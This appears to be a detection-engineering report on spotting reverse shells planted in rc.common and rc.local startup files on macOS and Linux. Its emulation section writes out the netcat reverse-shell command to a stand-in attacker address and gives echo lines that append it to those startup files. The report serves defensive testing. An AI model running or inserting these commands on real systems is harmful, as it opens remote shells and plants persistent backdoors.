# Alerting & Detection Strategy (ADS) Report

## Goal
The aim of this technique is to detect adversarial attempts to bypass security monitoring using reverse command shell scripts on macOS and Linux platforms.

## Categorization

- **Platforms:** macOS, Linux

## Strategy Abstract
The detection strategy leverages log analysis from system files such as `rc.common`, `rc.local`, and other startup scripts to identify anomalous activities. It focuses on monitoring for unusual modifications or the creation of reverse command shell scripts that could facilitate unauthorized access or persistence. Patterns are analyzed for known malicious indicators, including unexpected network connections initiated by these scripts.

## Technical Context
Adversaries typically exploit system initialization files like `rc.common` and `rc.local` to insert commands that create a persistent backdoor. These scripts can establish reverse shells, allowing attackers remote control over compromised systems without direct user interaction. In real-world scenarios, this technique is often used after initial access has been gained to ensure continued presence even if the original exploit vector is discovered.

### Adversary Emulation Details
- **Sample Commands:** `nc -e /bin/sh attacker_ip_address port`
- **Test Scenarios:**
  - Modify `rc.local` to include a reverse shell command.
  - Trigger system restart and monitor for network connections originating from the host machine.

## Blind Spots and Assumptions
- Assumes that all relevant log files are accessible and properly configured.
- Does not account for sophisticated obfuscation techniques that might hide script execution.
- Relies on known indicators; new or unknown variants may evade detection.

## False Positives
- Legitimate use of `rc.local` by system administrators for benign automation tasks.
- Network connections initiated by authorized maintenance scripts.
- Temporary debugging scripts left in initialization files during development or troubleshooting.

## Priority
**High**: This technique poses a significant risk as it allows adversaries to maintain persistence and escalate privileges, potentially leading to full system compromise. The stealthy nature of reverse shells makes them particularly dangerous for bypassing traditional security controls.

## Validation (Adversary Emulation)
### Step-by-Step Instructions

1. **Preparation:**
   - Ensure you have administrative access to a test environment running macOS or Linux.
   - Set up network monitoring tools to capture outgoing connections.

2. **Modify `rc.common`:**
   - Open the file with a text editor (e.g., `sudo nano /etc/rc.common`).
   - Insert a command for a reverse shell: 
     ```bash
     echo "nc -e /bin/sh attacker_ip_address port" >> /etc/rc.common
     ```

3. **Modify `rc.local`:**
   - Open the file with a text editor (e.g., `sudo nano /etc/rc.local`).
   - Insert the same command:
     ```bash
     echo "nc -e /bin/sh attacker_ip_address port" >> /etc/rc.local
     ```

4. **Restart System:**
   - Reboot the test machine to trigger the scripts.

5. **Monitor Network Activity:**
   - Use a network monitoring tool to observe connections originating from the test machine to confirm shell activation.

6. **Analyze Logs:**
   - Review system logs for modifications in `rc.common` and `rc.local`.
   - Look for unauthorized changes or unexpected script executions.

## Response
When an alert is triggered, analysts should:

- Immediately isolate the affected system to prevent further compromise.
- Conduct a thorough investigation of the startup scripts (`rc.common`, `rc.local`) for unauthorized changes.
- Review network logs for suspicious outbound connections that match known patterns of reverse shell traffic.
- Determine if additional systems have been compromised by similar methods and expand the investigation accordingly.

## Additional Resources

Currently, no specific resources are available. Analysts should refer to general cybersecurity guidelines on detecting and responding to persistence mechanisms and privilege escalation techniques.
